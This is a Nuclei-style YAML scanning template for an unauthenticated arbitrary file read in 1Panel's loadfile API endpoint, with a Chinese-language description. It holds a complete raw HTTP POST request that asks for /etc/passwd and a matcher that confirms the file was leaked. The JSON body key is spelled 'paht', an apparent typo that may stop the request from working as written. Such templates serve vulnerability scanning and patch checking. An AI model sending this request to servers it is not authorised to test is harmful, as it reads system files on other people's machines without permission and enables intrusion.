id: 1panel-loadfile-File-Reading

info:
  name: 1Panel loadfile 任意文件读取
  author: HuanXiong
  severity: high
  description: |
    1Panel的loadfile接口存在未授权访问漏洞，攻击者可以通过该接口读取服务器任意文件，包括敏感的系统文件如/etc/passwd。
  tags: File Reading

http:
  - raw:
      - |
        POST /api/v1/file/loadfile HTTP/1.1
        Host: {{Hostname}}
        User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/140.0.0.0 Safari/537.36
        Content-Type: application/json; charset=utf-8
        Accept: application/json
        Accept-Encoding: gzip, deflate, br
        Accept-Language: zh-CN,zh;q=0.9,en;q=0.8
        Connection: close

        {"paht":"/etc/passwd"}

    matchers:
      - type: dsl
        name: 任意文件读取
        dsl:
          - "status_code==200 && contains_all(body,'sbin','root:x')"